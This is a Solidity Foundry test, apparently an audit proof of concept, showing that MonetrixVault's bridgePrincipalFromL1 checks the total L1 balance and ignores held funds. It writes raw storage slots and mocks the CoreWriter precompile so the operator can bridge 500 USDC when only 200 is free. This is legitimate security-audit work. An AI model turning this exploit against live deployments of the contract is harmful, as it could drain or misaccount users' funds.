// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/interfaces/HyperCoreConstants.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy protocol via ToL1WeiHarness, mock CoreWriter, and fund accounts.
// 2. [T=0] Set Vault's outstandingL1Principal (OLP) to 1000 USDC via vm.store to simulate bridged principal.
// 3. [T=1] Set Vault's internal L1 spot balance tracking to total=1000, hold=800 (free=200).
// 4. [T=2] Operator calls bridgePrincipalFromL1(500).
// 5. [Exploit] The check uses `total` (1000) instead of `total - hold` (200). 1000 >= 500 passes.
// 6. [Assert] Verify OLP is decremented by 500 despite only 200 being actually free/transferable on L1.

contract AuditAgentPoC is Test, ToL1WeiHarness {
    MonetrixVault targetVault;
    address operatorAddr;

    function setUp() public {
        harness = new ToL1WeiHarness();
        targetVault = harness.vault();
        operatorAddr = harness.operator();
    }

    function test_exploit() public {
        // Mock the CoreWriter precompile so bridge actions don't revert on L1 simulation
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);

        // Storage slot 14: outstandingL1Principal
        // Set to 1000e6 so the vault believes it has 1000 USDC principal on L1 to bridge back
        vm.store(address(targetVault), bytes32(uint256(14)), bytes32(uint256(1000e6)));

        // Storage slot 15: L1 Spot Balance struct { uint64 total; uint64 hold; ... }
        // Pack total = 1000e6 and hold = 800e6 into a single 32-byte word
        // Assuming layout: total in lower 64 bits, hold in next 64 bits
        uint256 total = 1000e6;
        uint256 hold = 800e6;
        uint256 packedBalance = total | (hold << 64);
        vm.store(address(targetVault), bytes32(uint256(15)), bytes32(packedBalance));

        uint256 olpBefore = targetVault.outstandingL1Principal();
        console.log("Step 1: olpBefore =", olpBefore);
        console.log("Step 1: L1 total =", total);
        console.log("Step 1: L1 hold =", hold);
        console.log("Step 1: L1 free =", total - hold);

        // Operator attempts to bridge 500 USDC.
        // Free balance is only 200 USDC, but the vulnerable check uses `total` (1000 >= 500).
        vm.prank(operatorAddr);
        targetVault.bridgePrincipalFromL1(500e6);

        uint256 olpAfter = targetVault.outstandingL1Principal();
        console.log("Step 2: olpAfter =", olpAfter);

        // Assert that OLP was decremented by 500e6, proving the bridge was allowed
        // despite insufficient free balance (200 < 500).
        assertEq(olpAfter, olpBefore - 500e6, "OLP decremented despite insufficient free L1 balance");
    }
}

contract MockCoreWriter {
    fallback() external payable {
        // Return success for any precompile call
        assembly {
            mstore(0, 1)
            return(0, 32)
        }
    }
}
